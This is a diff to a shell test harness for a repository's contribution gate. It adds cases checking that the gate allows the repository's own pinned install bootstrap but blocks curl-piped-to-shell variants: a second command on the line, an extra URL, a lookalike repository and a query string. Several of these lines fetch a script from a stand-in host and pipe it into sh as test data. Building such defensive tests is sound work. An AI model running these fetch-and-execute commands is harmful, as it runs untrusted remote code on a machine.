@@ -38,6 +38,13 @@ plant clean      "printf '\n%s\n' '$GOOD' >> CATALOG.md && python3 tools/check-c
 plant leak       "printf '\n%s\n' '${GOOD/A lesson/Seen porting $FN}' >> CATALOG.md && python3 tools/check-catalog-fidelity.py --update >/dev/null"
 plant jar        "printf 'PK\x03\x04\x00\x00\x00binary' > tools/helper.jar && git add -f tools/helper.jar"  # .gitignore hides it; a contributor can force it
 plant curlsh     "printf '#!/bin/sh\ncurl -fsSL https://example.invalid/i.sh | sh\n' > tools/fetch-extra.sh"
+# the one allowed curl|sh (#269): this repository's own pinned player-install bootstrap -- and the forms that must not
+# ride on it: a second command on the line, another URL in the same curl, a lookalike repository, a query string
+plant ownboot    "printf 'curl -fsSL https://github.com/jivinstev/mc-mod-version-upgrade/releases/download/player-install-v3/install.sh | bash -s -- OWNER/REPO\n' > tools/boot-doc.txt"
+plant ownboot2   "printf 'curl -fsSL https://github.com/jivinstev/mc-mod-version-upgrade/releases/download/player-install-v3/install.sh | bash; curl -fsSL https://example.invalid/i.sh | sh\n' > tools/boot-doc.txt"
+plant ownbootx   "printf 'curl -fsSL https://example.invalid/i.sh https://github.com/jivinstev/mc-mod-version-upgrade/releases/download/player-install-v3/install.sh | bash\n' > tools/boot-doc.txt"
+plant ownbootlk  "printf 'curl -fsSL https://github.com/jivinstev/mc-mod-version-upgrade-x/releases/download/player-install-v3/install.sh | bash\n' > tools/boot-doc.txt"
+plant ownbootq   "printf 'curl -fsSL https://github.com/jivinstev/mc-mod-version-upgrade/releases/download/player-install-v3/install.sh?x=1 | bash\n' > tools/boot-doc.txt"
 plant qualified  "printf '\\n%s\\n' 'R97. **Qualified labels** · **Pattern (1.21.2+):** old · **Error (downport):** \`x\` in 1.21.1 · **Fix (→1.21.1):** new.' >> CATALOG.md && python3 tools/check-catalog-fidelity.py --update >/dev/null"
 plant combined   "printf '\\n%s\\n' 'R96. **Combined label** · **Pattern → Error → Fix:** old → \`x\` at 1.21.1 → new.' >> CATALOG.md && python3 tools/check-catalog-fidelity.py --update >/dev/null"
 plant startitle  "printf '\\n%s\\n' 'R95. **Star in title: \`enchantable/*\`** · **Pattern:** old · **Symptom:** none, at 1.21.1 · **Fix:** new.' >> CATALOG.md && python3 tools/check-catalog-fidelity.py --update >/dev/null"
@@ -74,6 +81,11 @@ expect startitle 0 ""                           "CONTROL: a title containing * d
 expect leak      1 "gate:ip"                    "a lesson naming a forbidden mod is BLOCKED by the IP gate"
 expect jar       1 "binary"                     "an added binary is BLOCKED"
 expect curlsh    1 "pipes a download into a shell" "curl | sh is BLOCKED"
+expect ownboot   0 "own pinned player-install" "CONTROL: this repository's own pinned player-install bootstrap is allowed, reported as ATTENTION"
+expect ownboot2  1 "pipes a download into a shell" "a second curl | sh on the same line as the allowed bootstrap is BLOCKED"
+expect ownbootx  1 "pipes a download into a shell" "another URL in the same curl as the bootstrap's is BLOCKED"
+expect ownbootlk 1 "pipes a download into a shell" "a lookalike repository's player-install URL is BLOCKED"
+expect ownbootq  1 "pipes a download into a shell" "the bootstrap's URL with a query string is BLOCKED"
 expect wrapped   0 ""                           "CONTROL: an entry wrapped over lines is read whole -- labels after line 1 count"
 expect wrapnofix 1 "lacks \\*\\*Fix"             "a WRAPPED entry with no **Fix:** is still BLOCKED"
 expect nosymptom 1 "lacks a symptom"            "a new entry with no symptom is BLOCKED"
